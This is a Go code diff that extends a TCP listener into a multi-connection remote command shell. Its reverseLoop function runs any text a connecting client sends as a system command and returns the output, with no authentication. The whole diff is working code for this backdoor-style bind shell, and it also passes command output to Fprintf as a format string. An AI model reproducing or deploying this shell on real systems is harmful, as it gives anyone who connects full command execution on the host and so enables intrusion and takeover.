@@ -33,18 +33,15 @@ func listen(protocol string, host string) error {
 	}
 
 	fmt.Printf("Listening on %s..\n", host)
-
-	conn, err := ln.Accept()
-	if err != nil {
-		return err
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			return err
+		}
+		fmt.Printf("Connection accepted from %s!\n", conn.RemoteAddr().String())
+		fmt.Fprintf(conn, "You have successfully connected to %s!\n", conn.LocalAddr().String())
+		go reverseLoop(conn)
 	}
-	fmt.Printf("Connection accepted from %s!\n", conn.RemoteAddr().String())
-	fmt.Fprintf(conn, "You have successfully connected to %s!\n", conn.LocalAddr().String())
-	err = reverseLoop(conn)
-	if err != nil {
-		fmt.Println(err)
-	}
-	return nil
 }
 
 func reverseLoop(conn net.Conn) error {
@@ -54,14 +51,28 @@ func reverseLoop(conn net.Conn) error {
 			return err
 		}
 		command := strings.Split(strings.Trim(msg, "\n"), " ")
-		cmd := exec.Command(command[0], command[1:]...)
+		if strings.ToLower(command[0]) == "exit" || strings.ToLower(command[0]) == "quit" {
+			fmt.Println("Closing the connection!")
+			conn.Close()
+			return nil
+		}
+		if command[0] == "" {
+			continue
+		}
+		var cmd *exec.Cmd
+		if len(command) > 1 {
+			cmd = exec.Command(command[0], command[1:]...)
+		} else {
+			cmd = exec.Command(command[0])
+		}
 
 		var out bytes.Buffer
 		cmd.Stdout = &out
 		err = cmd.Run()
 		if err != nil {
-			return err
+			fmt.Fprintf(conn, "%s: command not found\n", command[0])
+		} else {
+			fmt.Fprintf(conn, out.String())
 		}
-		fmt.Fprintf(conn, out.String())
 	}
 }
